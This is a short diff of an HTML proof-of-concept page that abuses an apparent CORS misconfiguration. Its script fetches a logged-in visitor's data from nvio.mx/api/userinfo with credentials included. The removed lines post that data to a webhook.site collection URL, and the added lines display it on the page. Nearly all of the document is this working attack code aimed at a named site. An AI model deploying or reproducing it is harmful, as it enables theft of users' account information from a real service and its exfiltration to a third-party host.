@@ -2,16 +2,13 @@
 <html>
   <body>
     <script>
-      fetch("https://nvio.mx/api/userinfo", { credentials: "include" })
-        .then(res =>
-          res.text().then(data => {
-            fetch("https://webhook.site/35a80643-dbbd-426f-9b3d-5b9c7c924991", {
-              method: "POST",
-              body: "Status: " + res.status + "\n\n" + data
-            });
-          })
-        );
+      fetch("https://nvio.mx/api/userinfo", {
+        credentials: "include"
+      })
+        .then(res => res.text())
+        .then(data => {
+          document.write(`<h2>Response:</h2><pre>${data}</pre>`);
+        });
     </script>
-    <h1>Debugging CORS Response...</h1>
   </body>
 </html>
